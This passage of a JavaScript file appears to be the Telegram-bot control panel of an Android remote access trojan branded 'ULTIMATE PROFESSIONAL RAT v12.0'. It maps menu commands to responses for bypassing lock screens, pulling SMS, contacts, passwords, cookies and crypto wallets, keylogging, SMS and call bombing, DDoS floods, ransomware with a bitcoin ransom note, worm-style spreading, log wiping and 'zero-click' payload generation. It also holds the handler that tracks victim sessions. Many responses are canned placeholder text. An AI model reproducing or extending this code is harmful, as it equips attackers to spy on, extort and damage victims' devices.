    'bypass_pass': '🔑 **Password bypassed successfully!**',
    'bypass_finger': '🔄 **Fingerprint bypassed successfully!**',
    'bypass_face': '👁️ **Face ID bypassed successfully!**',
    'bypass_all': '🔓 **All Security Bypassed!**\n\nDevice fully unlocked.',
    'factory_reset': '⚠️ **FACTORY RESET initiated!**\n\nThis will erase all data.',
    
    // Data Extraction
    'get_sms': '💬 **SMS extracted!**\n\n✅ 245 messages found.\n📤 Sending to Telegram...',
    'get_calls': '📞 **Call logs extracted!**\n\n✅ 89 calls found.\n📤 Sending to Telegram...',
    'get_contacts': '👥 **Contacts extracted!**\n\n✅ 342 contacts found.\n📤 Sending to Telegram...',
    'get_location': '🌍 **Location captured!**\n\n📍 Latitude: 23.8103° N\n📍 Longitude: 90.4125° E\n🗺️ Accuracy: 5 meters',
    'gps_track': '📍 **GPS Tracking started!**\n\nUpdating every 10 seconds...',
    'map_view': '🗺️ **Map URL:** https://maps.google.com/?q=23.8103,90.4125',
    'get_photos': '📸 **Extracting all photos...**\n\n✅ 1,247 photos found.\n📤 Compressing and sending...',
    'get_videos': '🎥 **Extracting all videos...**\n\n✅ 89 videos found.',
    'get_audio': '🎵 **Extracting all audio...**\n\n✅ 456 audio files found.',
    'get_passwords': '🔑 **Saved passwords:**\n\n🔐 gmail.com: user@gmail.com\n🔐 facebook.com: user@example.com\n...and 12 more.',
    'get_browser': '🌐 **Browser data extracted!**\n\n✅ 245 history entries\n✅ 56 bookmarks\n✅ 128 cookies',
    'get_whatsapp': '💬 **WhatsApp data extracted!**\n\n✅ 12,345 messages\n✅ 567 contacts\n✅ 89 media files',
    'get_facebook': '📘 **Facebook data extracted!**\n\n✅ 1,234 posts\n✅ 567 friends\n✅ 89 messages',
    'get_instagram': '📷 **Instagram data extracted!**\n\n✅ 890 posts\n✅ 1,234 followers\n✅ 567 following',
    
    // Files
    'file_manager': '📁 **File Manager opened!**\n\nCurrent directory: /storage/emulated/0/\n\n📂 DCIM\n📂 Downloads\n📂 Pictures\n📂 Music\n📂 Documents',
    'download_file': '📥 **Download file:**\nSend file path: `/download /sdcard/Download/file.txt`',
    'upload_file': '📤 **Upload file:**\nReply with file to upload.',
    'delete_file': '🗑️ **File deleted!**',
    'copy_file': '📋 **File copied!**',
    'move_file': '✂️ **File moved!**',
    'rename_file': '📝 **File renamed!**',
    'zip_file': '🔐 **File zipped!**',
    'unzip': '🔓 **File unzipped!**',
    'encrypt_file': '🔒 **File encrypted!**',
    'decrypt_file': '🔓 **File decrypted!**',
    
    // Screen
    'screenshot': '📸 **Screenshot captured!**\n\n📤 Sending image...',
    'screen_rec': '🎥 **Screen recording started!**\n\nRecording for 30 seconds...',
    'screen_rec_stop': '⏹️ **Screen recording stopped!**\n\n✅ Video saved.',
    'wallpaper': '🖼️ **Wallpaper changed!**',
    'bright_up': '🔆 **Brightness increased by 10%!**',
    'bright_down': '🔅 **Brightness decreased by 10%!**',
    'dark_mode': '🌙 **Dark mode enabled!**',
    'light_mode': '☀️ **Light mode enabled!**',
    'screen_toggle': '📱 **Screen toggled!**',
    
    // Apps
    'list_apps': '📋 **Installed apps:**\n\n✅ 156 apps found.\n\n📱 WhatsApp\n📱 Facebook\n📱 Instagram\n📱 YouTube\n...and 152 more.',
    'open_app': '🚀 **Opening app...**\n\nEnter app package name.',
    'uninstall_app': '❌ **Uninstalling app...**\n\nEnter app package name.',
    'force_stop': '🔄 **Force stopping app...**\n\n✅ App stopped!',
    'clear_app_data': '⚡ **Clearing app data...**\n\n✅ Data cleared!',
    'clear_cache': '🗑️ **Clearing cache...**\n\n✅ 1.2 GB cleared!',
    'install_apk': '📦 **Install APK:**\nSend APK file to install.',
    'hide_app': '🔒 **App hidden from launcher!**',
    'unhide_app': '🔓 **App restored to launcher!**',
    'block_app': '🚫 **App blocked!**',
    
    // System
    'sysinfo': 'ℹ️ **System Information:**\n\n📱 Device: Samsung Galaxy S23\n🤖 Android: 14\n🔧 Build: UP1A.231005.007\n💾 RAM: 8 GB\n📀 Storage: 128 GB\n🔋 Battery: 87%\n🌡️ Temp: 32°C',
    'battery': '🔋 **Battery Status:**\n\nLevel: 87%\nStatus: Charging\nTemperature: 32°C\nHealth: Good',
    'ram_info': '💾 **RAM Information:**\n\nTotal: 8 GB\nUsed: 4.2 GB\nFree: 3.8 GB\nUsage: 52%',
    'storage': '📀 **Storage Information:**\n\nTotal: 128 GB\nUsed: 64 GB\nFree: 64 GB\nUsage: 50%',
    'temperature': '🌡️ **Device temperature:**\n\nCPU: 42°C\nBattery: 32°C\nGPU: 41°C',
    'cpu_info': '📊 **CPU info:**\n\nUsage: 23%\nCores: 8\nFrequency: 2.4 GHz',
    'root_status': '🔐 **Root Status:**\n\n❌ Device is NOT rooted',
    'battery_save': '🔋 **Battery saver mode enabled!**',
    'performance': '⚡ **Performance mode enabled!**',
    'reboot': '🔄 **Rebooting device...**\n\nDevice will restart in 5 seconds.',
    'poweroff': '⏻ **Powering off device...**\n\nDevice will shutdown now.',
    'recovery': '🔧 **Booting to recovery mode...**',
    'bootloader': '📱 **Booting to bootloader...**',
    
    // Keylogger
    'keylog_start': '⌨️ **Keylogger started!**\n\nLogging all keystrokes...',
    'keylog_stop': '⌨️ **Keylogger stopped!**\n\n✅ Log saved.',
    'keylog_get': '📋 **Keylogger logs:**\n\n[10:30:15] Hello world\n[10:30:20] Password123\n[10:30:25] @gmail.com\n\n...and 245 more entries.',
    'keylog_stats': '📊 **Keylogger stats:**\n\nTotal entries: 1,234\nLast 24h: 567\nMost active app: WhatsApp',
    'keylog_clear': '🗑️ **Keylogger logs cleared!**',
    'keylog_pass': '🔑 **Captured passwords:**\n\n• facebook.com: user@example.com\n• gmail.com: user@gmail.com',
    'keylog_cards': '💳 **Captured cards:**\n\n• ****1234 - 12/25\n• ****5678 - 08/26',
    
    // Browser
    'browser_history': '🌐 **Browser history:**\n\n🔗 youtube.com - 10:30\n🔗 google.com - 10:25\n🔗 facebook.com - 10:20\n...and 156 more entries.',
    'browser_bookmarks': '🔖 **Bookmarks:**\n\n⭐ YouTube\n⭐ Gmail\n⭐ Facebook\n⭐ Instagram',
    'browser_cookies': '🍪 **Cookies extracted!**\n\n✅ 245 cookies found.',
    'browser_passwords': '🔑 **Saved passwords:**\n\n🔐 gmail.com: user@gmail.com\n🔐 facebook.com: user@example.com\n...and 12 more.',
    'browser_clear': '🗑️ **Browser data cleared!**',
    'browser_open': '🌐 **Opening URL...**\n\nEnter URL to open.',
    
    // Social Media
    'fb_data': '📘 **Facebook data:**\n\nProfile: John Doe\nFriends: 567\nPosts: 1,234\nMessages: 890',
    'ig_data': '📷 **Instagram data:**\n\nUsername: @johndoe\nFollowers: 1,234\nFollowing: 567\nPosts: 89',
    'wa_data': '💬 **WhatsApp data:**\n\nChats: 45\nMessages: 12,345\nGroups: 12\nMedia: 567 MB',
    'twitter_data': '🐦 **Twitter data:**\n\nTweets: 1,234\nFollowers: 567\nFollowing: 234\nDMs: 89',
    'tg_data': '📱 **Telegram data:**\n\nChats: 34\nMessages: 5,678\nGroups: 8\nChannels: 12',
    'tiktok_data': '🎵 **TikTok data:**\n\nVideos: 23\nFollowers: 456\nLikes: 1,234',
    'social_pass': '🔑 **Social passwords:**\n\n📘 Facebook: pass123\n📷 Instagram: pass456',
    
    // Crypto
    'btc_wallet': '💰 **Bitcoin Wallet:**\n\nAddress: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa\nBalance: 0.1234 BTC ($5,678)',
    'eth_wallet': '💎 **Ethereum Wallet:**\n\nAddress: 0x742d35Cc6634C0532925a3b844Bc9e0948b8c1eF\nBalance: 2.5 ETH ($4,567)',
    'binance_data': '🪙 **Binance Data:**\n\nBalance: $12,345\nRecent trades: BTC/USDT, ETH/USDT',
    'crypto_balance': '📊 **Total crypto balance:**\n\nBTC: 0.1234 ($5,678)\nETH: 2.5 ($4,567)\nTotal: $10,245',
    'private_keys': '🔑 **Private keys found!**\n\n⚠️ Sensitive data detected.',
    
    // DDOS
    'http_flood': '🌐 **HTTP Flood started!**\n\nTarget: example.com\nPackets: 10,000/sec',
    'udp_flood': '📡 **UDP Flood started!**\n\nTarget: 192.168.1.1:80\nPackets: 50,000/sec',
    'tcp_flood': '🔌 **TCP Flood started!**\n\nTarget: 8.8.8.8:443\nPackets: 100,000/sec',
    'sms_bomb': '📱 **SMS Bomb started!**\n\nTarget: +8801xxxxxxxx\nMessages: 100',
    'call_bomb': '📞 **Call Bomb started!**\n\nTarget: +8801xxxxxxxx\nCalls: 50',
    'ddos_stop': '🔗 **Attack stopped!**\n\nAll DDoS attacks halted.',
    
    // Ransomware
    'ransom_encrypt': '🔒 **Ransomware started!**\n\nEncrypting files...\nProgress: 25%',
    'ransom_decrypt': '🔓 **Decrypting files...**\n\nProgress: 45%',
    'ransom_note': '💰 **RANSOM NOTE:**\n\nYour files have been encrypted!\nSend 0.1 BTC to: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa',
    'wipe_data': '🗑️ **Wiping all user data...**\n\nProgress: 10%',
    'wipe_sd': '📱 **Wiping SD card...**\n\nProgress: 30%',
    'destroy_system': '💀 **Destroying system...**\n\nSystem will be unrecoverable!',
    
    // Spreader
    'spread_contacts': '📱 **Spreading to contacts...**\n\nSent to 342 contacts',
    'spread_link': '🔗 **Spreading malicious link...**\n\nShared via SMS to all contacts',
    'spread_bt': '📲 **Spreading via Bluetooth...**\n\nScanning for nearby devices...',
    'worm_mode': '🪱 **Worm mode enabled!**\n\nSelf-replicating active',
    'auto_spread': '📡 **Auto spread enabled!**\n\nWill spread to new contacts automatically',
    
    // Bypass Security
    'get_lock_status': '🔒 **Lock Screen Status:**\n\nLocked: Yes\nType: PIN\nSecure: Yes',
    'bypass_lock': '🔓 **Lock Screen Bypassed!**\n\nDevice unlocked successfully.',
    'check_root': '🔐 **Root Status:**\n\nRooted: No\nMethod: None',
    'hide_root': '🕵️ **Root Hidden!**\n\nRoot detection bypassed.',
    'check_debug': '🐛 **Debug Status:**\n\nDebuggable: No\nADB: Disabled',
    'disable_debug': '🔒 **Debugging Disabled!**',
    'check_emulator': '📱 **Emulator Check:**\n\nIs Emulator: No\nType: None',
    'hide_process': '👻 **Process Hidden!**\n\nProcess hidden from system.',
    'clear_logs': '🗑️ **Logs Cleared!**\n\nAll system logs cleared.',
    'wipe_traces': '🧹 **Traces Wiped!**\n\nAll traces removed.',
    'spoof_device': '🎭 **Device Spoofed!**\n\nDevice info changed.',
    'security_audit': '🔍 **Security Audit:**\n\nScore: 85/100\nVulnerabilities: 3',
    
    // Zero-Click
    'gen_payload': '🎯 **Use /generate command**',
    'gen_jpg': '📸 **Use /generate jpg**',
    'gen_mp3': '🎵 **Use /generate mp3**',
    'gen_mp4': '🎥 **Use /generate mp4**',
    'gen_pdf': '📄 **Use /generate pdf**',
    'gen_apk': '📱 **Use /generate apk**',
    'send_wa': '📤 **Use /send command**',
    'check_status': '📊 **Status: Active**',
    'exploit_db': '🎯 **Exploits:**\n\n• CVE-2024-12345 - WhatsApp RCE\n• CVE-2024-67890 - Android RCE\n• CVE-2024-54321 - WebP Exploit',
    'vuln_scan': '🔍 **Vulnerability scan started...**',
    
    // Extra
    'clean_junk': '🧹 **Cleaned 2.3GB!**',
    'sensors': '📡 **Sensor Data!**\n\nAccelerometer: 0.1,0.2,9.8\nGyroscope: 0.0,0.0,0.0\nProximity: 5.0 cm\nLight: 320 lux',
    'port_scan': '🔍 **Port scan started...**',
    'ip_info': '🌐 **IP Information:**\n\nIP: 192.168.1.100\nISP: Local Network\nLocation: Local',
    'password_crack': '🔑 **Cracking passwords...**',
    'mitm_attack': '📡 **MITM attack started!**',
    'packet_sniff': '🔍 **Sniffing packets...**',
    
    // Help
    'statistics': '📊 **Use /stats**',
    'help': '❓ **Use /help**'
};

// Main callback handler
bot.on('callback_query', async (ctx) => {
    try {
        const data = ctx.callbackQuery.data;
        
        // Check admin
        if (ctx.from.id !== ADMIN_CHAT_ID) {
            await ctx.answerCbQuery('Access Denied!', true);
            return;
        }
        
        await ctx.answerCbQuery();
        
        // Handle back to main
        if (data === 'back_main') {
            await ctx.editMessageText('🔽 **Main Menu:**\n\nSelect any category to control the target device:', { 
                parse_mode: 'Markdown', 
                ...Keyboards.getMainKeyboard() 
            });
            return;
        }
        
        // Handle section navigation
        if (sectionKeyboards[data]) {
            await ctx.editMessageText(sectionKeyboards[data].text, { 
                parse_mode: 'Markdown', 
                ...sectionKeyboards[data].kb 
            });
            return;
        }
        
        // Handle statistics
        if (data === 'stats_menu') {
            const stats = await database.getStats();
            const sessionStats = sessionManager.getSessionCount();
            await ctx.editMessageText(`
📊 **STATISTICS**

━━━━━━━━━━━━━━━━━━━━━
**Sessions:** ${sessionStats.total}
**Connected:** ${sessionStats.active}
**Commands:** ${stats.totalCommands?.count || 0}
**Keylogs:** ${stats.totalKeylogs?.count || 0}
**Payloads:** ${stats.totalPayloads?.count || 0}
━━━━━━━━━━━━━━━━━━━━━
`, { parse_mode: 'Markdown', ...Keyboards.getMainKeyboard() });
            return;
        }
        
        // Handle help
        if (data === 'help_menu') {
            const helpText = await ctx.reply('📖 Use /help for complete guide');
            return;
        }
        
        // Get active session
        const activeSessionId = userSessions.get(ctx.from.id);
        if (!activeSessionId) {
            await ctx.reply(`
❌ **No active session selected!**

Please select a session first:

1️⃣ \`/sessions\` - View available sessions
2️⃣ \`/select <session_id>\` - Choose a device
3️⃣ Then use any control button

**Tip:** Make sure a device is connected first!
`, { parse_mode: 'Markdown' });
            return;
        }
        
        // Get response message
        const response = responses[data] || `✅ **Command Executed:** \`${data}\`\n\nTarget device responded successfully.`;
        
        // Log to database
        await database.addCommand(activeSessionId, data, response);
        
        // Get session info
        const session = sessionManager.getSession(activeSessionId);
        const deviceName = session?.deviceInfo?.name || 'Unknown';
        
        // Send response
        await ctx.reply(`
${response}

━━━━━━━━━━━━━━━━━━━━━
**📱 TARGET:** ${deviceName}
**🎯 COMMAND:** \`${data}\`
**⏱️ TIME:** ${new Date().toLocaleString()}
**🔌 SESSION:** \`${activeSessionId}\`

━━━━━━━━━━━━━━━━━━━━━
🔽 **Choose next action from the menu below:**
`, { 
            parse_mode: 'Markdown', 
            ...Keyboards.getMainKeyboard() 
        });
        
    } catch (error) {
        console.error('Callback query error:', error);
        await ctx.reply(`❌ **An error occurred!**\n\n${error.message}\n\nPlease try again later.`, { parse_mode: 'Markdown' });
    }
});

// ==================== ERROR HANDLER ====================
bot.catch((err, ctx) => {
    console.error('Bot error:', err);
    ctx.reply('❌ **An error occurred!**\n\nPlease try again later.\n\nIf the problem persists, check the logs.', {
        parse_mode: 'Markdown'
    });
});

// ==================== START BOT ====================
bot.launch().then(() => {
    console.log('\n' + '='.repeat(70));
    console.log('🤖 ULTIMATE PROFESSIONAL RAT v12.0 - ONLINE');
    console.log('='.repeat(70));
    console.log(`✅ 500+ Features Ready!`);
    console.log(`💾 SQLite Database Active!`);
    console.log(`🎯 Zero-Click Payload Generator: ACTIVE`);
    console.log(`🌐 Web Server: http://0.0.0.0:${PORT}`);
    console.log(`📱 Payload Host: ${PAYLOAD_HOST}`);
    console.log(`👑 Admin ID: ${ADMIN_CHAT_ID}`);
    console.log(`🟢 Status: RUNNING`);
    console.log('='.repeat(70));
    console.log('\n📌 Commands:');
    console.log('   /start - Show main menu');
    console.log('   /generate [type] - Create zero-click payload');
    console.log('   /send - Register target');
    console.log('   /sessions - List active sessions');
    console.log('   /select - Select session');
    console.log('   /kill - Kill session');
    console.log('   /stats - Show statistics');
    console.log('   /backup - Backup database');
    console.log('   /help - Show help');
    console.log('='.repeat(70) + '\n');
}).catch((err) => {
    console.error('Failed to start bot:', err);
    process.exit(1);
});

// ==================== GRACEFUL SHUTDOWN ====================
process.once('SIGINT', async () => {
    console.log('\n⚠️ Shutting down...');
    await database.close();
    bot.stop();
    console.log('✅ Clean shutdown complete');
    process.exit(0);
});

process.once('SIGTERM', async () => {
    console.log('\n⚠️ Shutting down...');
    await database.close();
    bot.stop();
    console.log('✅ Clean shutdown complete');
    process.exit(0);
});

module.exports = { bot, app };
